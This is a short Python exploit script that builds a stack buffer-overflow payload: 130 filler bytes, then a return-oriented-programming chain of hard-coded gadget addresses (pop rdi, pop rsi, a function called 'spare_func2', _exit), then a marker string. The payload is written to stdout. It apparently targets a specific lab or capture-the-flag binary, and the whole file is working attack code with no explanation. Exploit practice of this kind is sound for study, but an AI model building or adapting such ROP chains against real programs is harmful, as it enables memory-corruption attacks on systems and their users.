#!/usr/bin/env python3

import sys


oflow = b'A' * 130
string = b"smooth criminal\0"

# GDB: 0xffffcf9c, native 0xffffd01c
#stack_base=0x7fffffffde38
stack_base=0x7fffffffde88

# string + 0x40
string_addr = stack_base + 0x40 
gadgets = [
        # pop rdi; ret
        0x400696.to_bytes(8, byteorder='little'), 0x2.to_bytes(8, byteorder='little'), 
        # pop rsi ; ret
        0x400bc7.to_bytes(8, byteorder='little'), string_addr.to_bytes(8, byteorder='little') ,
        # spare_func2
        0x400b7f.to_bytes(8, byteorder='little'), 
        # pop rdi; ret
        0x400696.to_bytes(8, byteorder='little'), 0x2.to_bytes(8, byteorder='little'), 
        # _exit, fakeret
        0x448e40.to_bytes(8, byteorder='little')
        ] 

exploit = bytearray(oflow)

for gadget in gadgets:
    exploit.extend(gadget)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
